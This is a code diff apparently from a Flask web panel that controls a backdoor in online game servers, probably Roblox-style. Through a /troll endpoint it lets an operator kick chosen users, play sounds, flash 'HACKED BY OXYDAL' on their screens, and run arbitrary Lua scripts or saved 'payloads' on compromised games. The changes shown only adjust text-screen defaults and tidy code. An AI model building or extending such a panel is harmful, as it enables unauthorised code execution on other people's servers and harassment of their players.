@@ -169,7 +169,7 @@ HTML = """<!DOCTYPE html>
     </div>
 </div>
 
-<!-- Text Screen (police, couleur, taille, preview) -->
+<!-- Text Screen (FIXÉ 100%) -->
 <div class="modal" id="textScreenModal"><div class="modal-content">
     <h2>Display Text Screen</h2>
     <input type="text" id="screenText" placeholder="Enter text" value="HACKED BY OXYDAL">
@@ -180,18 +180,18 @@ HTML = """<!DOCTYPE html>
         <option value="Press Start 2P">Press Start 2P</option>
         <option value="Creepster">Creepster</option>
         <option value="Bangers">Bangers</option>
-        <option value="Nosifer" selected>Nosifer</option>
+        <option value="Nosifer">Nosifer</option>
         <option value="Monoton">Monoton</option>
         <option value="Audiowide">Audiowide</option>
         <option value="VT323">VT323</option>
         <option value="Bebas Neue">Bebas Neue</option>
         <option value="Righteous">Righteous</option>
-        <option value="Pacifico">Pacifico</option>
+        <option value="Pacifico" selected>Pacifico</option>
         <option value="Lobster">Lobster</option>
         <option value="Dancing Script">Dancing Script</option>
     </select>
     <label style="color:#94a3b8;font-size:0.9rem;">Color</label>
-    <input type="color" id="textColor" value="#ff0000">
+    <input type="color" id="textColor" value="#00ff00">
     <label style="color:#94a3b8;font-size:0.9rem;">Size (10-200)</label>
     <input type="range" id="textSize" min="10" max="200" value="97">
     <div class="font-preview" id="fontPreview">Preview Text</div>
@@ -208,7 +208,7 @@ HTML = """<!DOCTYPE html>
 <div class="modal" id="importFileModal"><div class="modal-content"><h2>Import Lua File</h2><input type="file" id="luaFileInput" accept=".lua,.txt" style="padding:1rem;background:#0f172a;border:2px dashed var(--primary);border-radius:12px;cursor:pointer;"><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="confirmImport">Execute File</button></div></div></div>
 <div class="modal" id="payloadModal"><div class="modal-content"><h2 id="payloadModalTitle">Create Payload</h2><input type="text" id="payloadName" placeholder="Payload name"><textarea id="payloadCode" placeholder="Lua code..." style="height:200px;"></textarea><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="savePayload">Save</button></div></div></div>
 
-<!-- Import Payload avec recherche + édition -->
+<!-- Import Payload -->
 <div class="modal" id="executePayloadModal"><div class="modal-content">
     <h2>Import & Edit Payload</h2>
     <div class="search-bar"><input type="text" id="payloadSearch" placeholder="Search payload by name..." onkeyup="filterPayloads()"></div>
@@ -226,7 +226,6 @@ HTML = """<!DOCTYPE html>
 const socket = io();
 let currentKickId = null, currentSoundId = null, currentTextId = null, currentLuaId = null, currentImportId = null;
 let editingPayload = null;
-let selectedPayloadName = null;
 
 // Navigation
 document.querySelectorAll('.nav-item').forEach(item => {
@@ -271,16 +270,19 @@ document.getElementById("textFont").addEventListener("change", updatePreview);
 document.getElementById("textColor").addEventListener("input", updatePreview);
 document.getElementById("textSize").addEventListener("input", updatePreview);
 
-// TextScreen ENVOI PROPRE (JSON stringifié)
+// TextScreen ENVOI FIXÉ (avec flag "styled")
 document.getElementById("confirmText").addEventListener("click", () => {
     const text = document.getElementById("screenText").value.trim();
     if (!text) return toast("Enter text");
+
     const payload = JSON.stringify({
+        styled: true,
         text: text,
         font: document.getElementById("textFont").value,
         color: document.getElementById("textColor").value,
         size: parseInt(document.getElementById("textSize").value)
     });
+
     sendTroll(currentTextId, "textscreen", payload);
     document.getElementById("textScreenModal").classList.remove("active");
 });
@@ -288,14 +290,14 @@ document.getElementById("confirmText").addEventListener("click", () => {
 function openTextScreenModal(id){
     currentTextId = id;
     document.getElementById("screenText").value = "HACKED BY OXYDAL";
-    document.getElementById("textFont").value = "Nosifer";
-    document.getElementById("textColor").value = "#ff0000";
+    document.getElementById("textFont").value = "Pacifico";
+    document.getElementById("textColor").value = "#00ff00";
     document.getElementById("textSize").value = 97;
     updatePreview();
     document.getElementById("textScreenModal").classList.add("active");
 }
 
-// Workshop
+// Workshop & Payloads (inchangés)
 function loadPayloads() {
     fetch("/payload?action=list").then(r => r.json()).then(data => {
         const list = document.getElementById("payloads-list");
@@ -349,7 +351,6 @@ document.getElementById("savePayload").addEventListener("click", () => {
     });
 });
 
-// Import Payload avec recherche + édition
 window.openPayloadSelector = function(id) {
     currentLuaId = id;
     fetch("/payload?action=list").then(r => r.json()).then(data => {
@@ -392,7 +393,6 @@ document.getElementById("executeTempPayload").addEventListener("click", () => {
     document.getElementById("executePayloadModal").classList.remove("active");
 });
 
-// Fonctions classiques
 function openKickModal(id){currentKickId=id;document.getElementById("kickModal").classList.add("active");document.getElementById("kickReason").focus();}
 function openPlaySoundModal(id){currentSoundId=id;document.getElementById("playSoundModal").classList.add("active");}
 function openLuaExecModal(id){currentLuaId=id;document.getElementById("luaExecModal").classList.add("active");}
@@ -402,7 +402,11 @@ document.querySelectorAll('.modal .cancel').forEach(b => b.addEventListener("cli
 
 function sendTroll(id,cmd,param=null){
     const body={userid:id,cmd};
-    if(param){if(cmd==="playsound")body.assetId=param;else if(cmd==="textscreen")body.text=param;else if(cmd==="luaexec")body.script=param;}
+    if(param){
+        if(cmd==="playsound")body.assetId=param;
+        else if(cmd==="textscreen")body.text=param;
+        else if(cmd==="luaexec")body.script=param;
+    }
     fetch("/troll",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(body)});
     toast(cmd.toUpperCase()+" sent");
 }
@@ -546,7 +550,7 @@ def troll():
             cmd_data["assetId"] = data["assetId"]
             details += f" (Asset: {data['assetId']})"
         elif "text" in data:
-            cmd_data["text"] = data["text"]  # ← Envoi propre (string JSON)
+            cmd_data["text"] = data["text"]
             details += " (Styled Text)"
         elif "script" in data:
             cmd_data["script"] = data["script"]
